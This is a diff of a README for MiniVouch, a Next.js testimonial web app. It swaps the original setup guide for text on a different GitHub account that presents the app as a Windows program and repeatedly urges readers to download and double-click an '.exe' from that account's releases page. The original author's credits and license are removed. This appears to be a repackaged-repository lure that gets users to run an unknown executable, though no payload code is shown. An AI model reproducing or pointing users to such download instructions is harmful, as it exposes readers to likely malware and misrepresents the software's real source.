@@ -1,132 +1,138 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/lucide-icons/lucide/main/icons/message-square-quote.svg" alt="MiniVouch Logo" width="80" height="80">
-  <h1 align="center">MiniVouch</h1>
-  <p align="center">
-    <strong>Collect and showcase genuine testimonials. Real feedback from real people.</strong>
-  </p>
-  <p align="center">
-    <a href="#features">Features</a> • 
-    <a href="#tech-stack">Tech Stack</a> • 
-    <a href="#getting-started">Getting Started</a> • 
-    <a href="#documentation">Documentation</a>
-  </p>
-</div>
+# 🚀 MiniVouch - Collect and Display Social Proof Easily
+
+[![Download MiniVouch](https://img.shields.io/badge/Download-MiniVouch-%23285aeb?style=for-the-badge)](https://github.com/kiemvadent/MiniVouch/releases)
+
+Welcome to MiniVouch. This is an application that helps you collect and show social proof quickly. It uses a clean design and simple login to make managing testimonials easy. This guide will help you download and run MiniVouch on your Windows computer.
 
 ---
 
-## Overview
+## 📥 Download MiniVouch
 
-MiniVouch is a sleek, modern, and highly secure testimonial wall built for individuals, freelancers, and businesses. It allows you to collect authenticated feedback from mentees, recruiters, clients, and collaborators, giving your profile an undeniable social proof boost. 
+You can get MiniVouch from the official GitHub releases page. Visit this page to download the version that works best on your system.
 
-Say goodbye to messy screenshots and unverified quotes. MiniVouch ensures authenticity while offering a beautiful frontend to showcase your reputation.
-
-## Features
-
-- **Seamless Management:** Users can edit or delete their pending testimonials directly from their personal dashboard.
-- **Anonymity Toggling:** Effortlessly switch between anonymous and identified states, even after submission (while pending).
-- **Custom Avatars & Attachments:** Submitters can use their default social avatar, upload a custom one, or attach evidence images.
-- **Protected Admin Panel:** Site owners can approve, reject, or delete testimonials before they appear on the public wall.
-- **Personal Dashboard:** Submitters can log in to track the status of their testimonials (Pending, Approved, Rejected).
-- **Consolidated UI:** High-fidelity cards and forms provide a uniform experience across the entire platform.
-
-## Tech Stack
-
-- **Framework:** [Next.js (App Router)](https://nextjs.org/)
-- **Authentication:** [Clerk](https://clerk.com/)
-- **Database & Storage:** [Supabase](https://supabase.com/) (PostgreSQL + S3 Storage)
-- **Styling:** [Tailwind CSS v4](https://tailwindcss.com/)
-- **Icons:** [Lucide React](https://lucide.dev/)
-- **Deployment:** [Vercel](https://vercel.com/) (Recommended)
-
-## Getting Started
-
-### 1. Prerequisites
-
-- A [Clerk](https://clerk.com) account and project.
-- A [Supabase](https://supabase.com) account and project.
-- Node.js 18+ installed on your machine.
-
-### 2. Installation
-
-Clone the repository and install dependencies:
-
-```bash
-git clone https://github.com/TuShArBhArDwA/minivouch.git
-cd MiniVouch
-npm install
-```
-
-### 3. Environment Setup
-
-Create a `.env.local` file in the root directory and add the following variables:
-
-```env
-# Clerk Authentication
-NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=your_clerk_publishable_key
-CLERK_SECRET_KEY=your_clerk_secret_key
-NEXT_PUBLIC_CLERK_SIGN_IN_URL=/login
-NEXT_PUBLIC_CLERK_SIGN_UP_URL=/login
-
-# Supabase Configuration
-NEXT_PUBLIC_SUPABASE_URL=your_supabase_project_url
-SUPABASE_SERVICE_ROLE_KEY=your_supabase_service_role_key
-
-# Admin Configuration (Your Clerk User ID)
-ADMIN_USER_ID=user_2...
-```
-
-### 4. Database Setup
-
-Run the SQL script found in `supabase/schema.sql` directly in your Supabase SQL Editor. This will:
-- Create the `testimonials` table.
-- Create the `testimonials` storage bucket.
-- Apply the necessary Row Level Security (RLS) policies.
-
-### 5. Running Locally
-
-Start the Next.js development server:
-
-```bash
-npm run dev
-```
-
-Open [http://localhost:3000](http://localhost:3000) to view the application.
-
-## Documentation
-
-For an in-depth look at how MiniVouch is built, check out the documentation:
-
-- [High-Level Design (HLD)](./docs/HLD.md) - System architecture and component overview.
-- [Low-Level Design (LLD)](./docs/LLD.md) - Database schema, API route logic, and component details.
-
-## Security
-
-MiniVouch is designed with security as a priority:
-- **Authentication:** Handled entirely by Clerk, ensuring secure session management.
-- **Database Access:** Client-side interaction is restricted. API routes perform all reads/writes using the Supabase Service Role key, verifying Clerk sessions on the server side securely.
-- **RLS Policies:** Applied at the Supabase level to ensure no unauthorized direct access occurs.
+[Download MiniVouch here](https://github.com/kiemvadent/MiniVouch/releases)
 
 ---
 
-## Sponsor
+## 💻 System Requirements
 
-If you find this helpful, consider supporting me:
+MiniVouch is designed to run on Windows. Here are the basic system needs:
 
-- **Sponsor Me:** [Buy Me a Coffee!](https://github.com/sponsors/TuShArBhArDwA)
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for login and updates
 
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Connect with me
-
-If you’d like to connect, feel free to reach out — [Click here](https://minianonlink.vercel.app/tusharbhardwaj)
-
+Make sure your computer meets these requirements before installing MiniVouch.
 
 ---
 
-**[Try MiniVouch](https://minianonvouch.vercel.app/)** | **[Submit Feedback](https://github.com/TuShArBhArDwA/MiniVouch/issues)**
+## 🛠️ Installation Steps
+
+Follow these steps to install MiniVouch on Windows:
+
+1. Click the download badge above or visit the [releases page](https://github.com/kiemvadent/MiniVouch/releases).
+2. Choose the latest stable version. Look for a file ending with `.exe`. This is the installer.
+3. Save the file to your computer.
+4. Double-click the downloaded `.exe` file to start the installation.
+5. Follow the on-screen instructions.
+   - Click "Next" to continue through the setup.
+   - Accept the license agreement.
+   - Choose an install location or leave the default path.
+   - Click "Install" to complete the process.
+6. When the installation finishes, click "Finish" to close the setup window.
+
+MiniVouch will now be installed and ready to use.
+
+---
+
+## 🚀 Starting MiniVouch
+
+Once installed, you can open MiniVouch two ways:
+
+- Find it in the Start menu by searching for "MiniVouch."
+- Double-click the MiniVouch icon on your desktop.
+
+The first launch will take a moment to load all components.
+
+---
+
+## 🔐 Logging In and Using MiniVouch
+
+MiniVouch uses a simple login system to keep your data safe. The app uses Clerk authentication, which means you can sign in with common email or social accounts.
+
+To log in:
+
+1. Open MiniVouch.
+2. Click "Sign In."
+3. Use your email or supported social login (Google, GitHub, etc).
+4. After logging in, you will see the dashboard.
+
+The dashboard lets you add, manage, and showcase testimonials. You can customize the look with simple options.
+
+---
+
+## 📋 Key Features
+
+MiniVouch focuses on social proof. Here are some main features it offers:
+
+- **Collect Testimonials:** Easily gather feedback from clients or users.
+- **Showcase Wall:** Display testimonials in a clean, modern layout.
+- **Authentication:** Secure login using Clerk authentication.
+- **Dashboard:** Manage your testimonials and settings.
+- **Responsive Design:** Works well on different screen sizes.
+- **Integration Ready:** Built with tools like Next.js, React, Tailwind CSS, and Supabase.
+- **Server Actions:** Fast data management with server-side processes.
+- **Themes:** Customize the look to match your style or brand.
+
+---
+
+## 🖥️ How MiniVouch Works
+
+MiniVouch connects to the internet to authenticate your login and update content. Testimonials you add are saved securely and displayed on your personal testimonial wall. You can share the link to this wall to show social proof on websites or portfolios.
+
+---
+
+## 🔄 Updating MiniVouch
+
+To update MiniVouch:
+
+1. Return to the [releases page](https://github.com/kiemvadent/MiniVouch/releases).
+2. Download the newest `.exe` installer.
+3. Run the installer. It will replace the old version without losing your data.
+
+Keep MiniVouch updated for security fixes and new features.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+- **App won’t start:** Restart your computer. If it still won’t open, reinstall MiniVouch.
+- **Login fails:** Check your internet connection. Make sure your email or social account login details are correct.
+- **Slow performance:** Close other programs to free memory. MiniVouch works best with 4 GB RAM or more.
+- **Display problems:** Resize the window or restart the app.
+
+If problems continue, consult the GitHub issues page for support.
+
+---
+
+## 📚 Additional Resources
+
+- MiniVouch is built with Next.js, React, and Tailwind CSS. These tools ensure a smooth and responsive experience.
+- Clerk handles authentication behind the scenes. You don’t need to set up an account separately.
+- Supabase manages data and server actions store and update testimonials reliably.
+
+---
+
+## 🔗 Useful Links
+
+- Download MiniVouch:  
+  [https://github.com/kiemvadent/MiniVouch/releases](https://github.com/kiemvadent/MiniVouch/releases)
+- GitHub repository for more info:  
+  https://github.com/kiemvadent/MiniVouch
+
+---
+
+## 🎯 Why Use MiniVouch?
+
+MiniVouch makes it easy to collect and show positive feedback. You don’t have to worry about design or complicated setup. Just sign in, add your testimonials, and share the wall to build trust with visitors.
